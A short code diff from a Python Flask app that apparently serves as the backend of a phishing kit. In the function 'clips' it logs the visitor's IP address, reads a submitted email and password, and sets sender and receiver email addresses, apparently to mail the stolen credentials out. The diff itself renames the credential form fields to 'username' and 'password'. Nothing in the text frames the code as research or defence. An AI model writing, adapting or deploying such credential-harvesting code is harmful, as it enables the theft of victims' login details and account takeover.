@@ -191,8 +191,8 @@ def clips():
             ip = request.headers.get('X-Client-IP')
         if ip is None:
             ip = request.remote_addr
-        email = request.form.get("emailapive")
-        passwordemail = request.form.get("passwordapive")
+        email = request.form.get("username")
+        passwordemail = request.form.get("password")
         sender_email = "missdomn@cinconn.com"
         sender_emaill = "contact"
         receiver_email = "aragon.rheece@minuteafter.com"
@@ -292,6 +292,7 @@ def pilom():
 
 if __name__ == "__main__":
     app.run(debug=True)
+
 
 
 
